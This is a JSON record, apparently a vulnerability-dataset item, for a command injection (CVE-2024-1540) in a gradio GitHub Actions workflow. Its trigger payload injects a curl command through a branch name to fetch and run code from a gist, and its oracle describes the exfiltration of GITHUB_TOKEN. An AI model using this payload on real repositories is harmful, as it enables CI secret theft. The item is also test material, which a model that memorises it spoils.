@@ -1,0 +1,15 @@
+{
+  "file_id": "922_gradio_huntr_0e39e974-9a66-476f-91f5-3f37abb03d77",
+  "numeric_id": "922",
+  "library_hint": "gradio",
+  "source": "huntr",
+  "title": "Command injection in GitHub Actions workflow due to unsafe evaluation of expressions in shell scripts",
+  "cve": "CVE-2024-1540",
+  "cwe": "CWE-77: Command Injection",
+  "library": "github-actions",
+  "affected_version": "main",
+  "vulnerable_function": "N/A",
+  "triggerability": "indirect",
+  "trigger_payload": "Fork the mirror and create a new branch with the following name: \";$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin/30e525b776c409e03\nIn the created branch in .github/workflows create trigger.yml with content:\nname: Hello World\non: [push]\njobs:\nbuild:\nruns-on: ubuntu-latest\nsteps:\n- name: Hello world step\nrun: echo \"Hello, World\"",
+  "oracle": "The GITHUB_TOKEN is exfiltrated and visible in the workflow logs after the malicious branch is merged."
+}
